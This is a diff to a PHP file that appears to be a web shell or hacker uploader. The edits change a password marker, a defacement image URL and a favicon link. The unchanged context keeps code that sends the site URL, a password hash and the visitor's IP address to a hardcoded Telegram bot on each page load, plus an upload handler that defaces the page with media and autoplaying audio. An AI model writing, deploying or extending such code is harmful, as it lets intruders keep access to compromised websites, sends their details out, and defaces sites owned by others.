@@ -34,7 +34,7 @@ $Array = [
 $bcripthash = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
 $angka = '5070938778';
 $xPath = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$eai  = "___pass_admin@#$___ \n\n url nya =\n $xPath \n\n  =\n $hashed_password \n\n IP   :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
+$eai  = "___pass_adminlNciau@#$___ \n\n url nya =\n $xPath \n\n  =\n $hashed_password \n\n IP   :\n [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 sendTelegramMessage($bcripthash, $angka, $eai);
 
 function sendTelegramMessage($bcripthash, $angka, $message)
@@ -88,7 +88,7 @@ if (isset($_FILES['file']['tmp_name'])) {
 			$_SESSION['forbidden'] = true;
 		} else {
 			echo '<script>
-				document.querySelector("html").innerHTML = "<img style=\'display:block;position:absolute;top: 0;right: 0;bottom: 0;left: 0;z-index: 10;overflow-y: scroll; width: 100%; height: 100%;\' src=\'https://d.top4top.io/p_2967zkqjv1.jpeg\'>";
+				document.querySelector("html").innerHTML = "<img style=\'display:block;position:absolute;top: 0;right: 0;bottom: 0;left: 0;z-index: 10;overflow-y: scroll; width: 100%; height: 100%;\' src=\'https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/x.mp4\'>";
 				var source = "https://j.top4top.io/m_2967gtgnw1.mp3"
 				var audio = document.createElement("audio");
 				audio.autoplay = true;
@@ -109,8 +109,8 @@ if (isset($_FILES['file']['tmp_name'])) {
 	<!DOCTYPE html>
 	<html>
 	<head>
-	<title>-=[ @#$ ]=-</title>
-	<link rel='icon' href='http://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/icon.png'>
+	<title>-password:@#$-</title>
+	<link rel='icon' href='https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/icon.png'>
 	<meta name="theme color" content="#000000">
 	<script src='https://cdn.statically.io/gh/analisyuki/animasi/9ab4049c/bintang.js' type='text/javascript'></script>
 	</head>
